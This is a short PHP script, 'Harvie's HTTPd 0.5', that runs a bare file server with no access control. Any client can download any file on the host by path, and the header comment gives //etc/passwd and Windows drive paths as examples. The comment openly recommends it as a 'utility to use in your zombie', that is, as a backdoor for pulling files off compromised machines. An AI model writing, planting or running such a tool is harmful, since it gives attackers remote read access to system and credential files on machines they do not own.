#!usr/bin/php
<?php
//Harvie's HTTPd 0.5
/*
  Allows you to binary safe download any file from remote pc
    http://server:port/file
    http://server:port//etc/passwd
    http://server:port/C:\dir\file
    http://server:port/C:/dir/file
  You can also play multimedia like streams (using XMMS, Winamp, etc...)
  But this can serve only one file a time
    (if you are streaming or downloading, you can download/browse anything other,
    but you can use download manager to download file by file...)
  You can change port or interface by passing arguments
  Usage: (httpd.php [port] [interface_IP])
  This is very nice utility to use in your zombie.
*/

//////////////////////////////////////////////////////////////////////////////////
$interface = "127.0.0.1";
$port = 81;
$index = "index.html";

//////////////////////////////////////////////////////////////////////////////////
$okheader = //Header 200
  "HTTP/1.0 200 OK\n".
  "Server: Harvie's HTTPd\n".
  "Connection: close\n\n";

$badheader = //Header 404
  "HTTP/1.0 404 File not found!\n".
  "Server: Harvie's HTTPd\n".
  "Connection: close\n\n";

$err404 = "ERR 404 - NOT FOUND!"; //Error 404

//////////////////////////////////////////////////////////////////////////////////
if(isset($argc)) {
  if($argc > 1) $port = trim($argv[1]);
  if($argc > 2) $interface = trim($argv[2]);
}

echo("\n\tStarting Harvie's HTTPd at:\n\ttcp://$interface:$port\n\n");
//system("title Harvie's HTTPd at tcp://$interface:$port"); //Microsoft Windows only
set_time_limit(0);
$sss = stream_socket_server("tcp://$interface:$port");

while(1) {
  @$sfp = stream_socket_accept($sss);
  if(!$sfp) continue;

  $loop = 1;
  while($sfp && !@feof($sfp) && $loop) {
    $line = fgets($sfp);
    //echo($line);
    if(eregi("(GET|POST)", $line)) {
      $line = trim($line);
      //echo($line);
      $line = explode(" ", $line);
      
      $line[1] = urldecode($line[1]);
      
      if($line[1] == "/") {
        $line[1] = $index;
      } else {
        $line[1] = substr($line[1], 1);
      }
      
      if(is_file($line[1])) { //200 OK
        fwrite($sfp, $okheader);
        echo("200 ".$line[1]."\n");
        $fp = fopen($line[1], "rb");
        while( fwrite($sfp, fgets($fp)) );
        @fclose($sfp);
      } else { //404 NOT FOUND
        echo("404 ".$line[1]."\n");
        fwrite($sfp, $badheader);
        fwrite($sfp, $err404);
        @fclose($sfp);
      }
      
      $loop = 0;
    }
  }
  @fclose($sfp);
}

?>
